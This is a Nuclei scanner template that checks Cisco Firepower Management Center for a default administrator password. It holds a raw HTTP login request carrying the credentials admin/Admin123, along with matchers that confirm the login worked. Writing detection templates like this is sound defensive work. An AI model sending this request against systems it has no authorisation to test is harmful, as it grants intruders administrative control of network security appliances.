id: cisco-firepower-default-password
info:
  name: Cisco Firepower Management Center Default Password
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Default password allows access to the administrator account on Cisco Firepower Management Center.
    This vulnerability enables an attacker to log in using default credentials.
  reference:
    - https://www.cisco.com/
http:
  - raw:
      - |
        POST /auth/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin&password=Admin123&endSession=1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"username":"admin"'
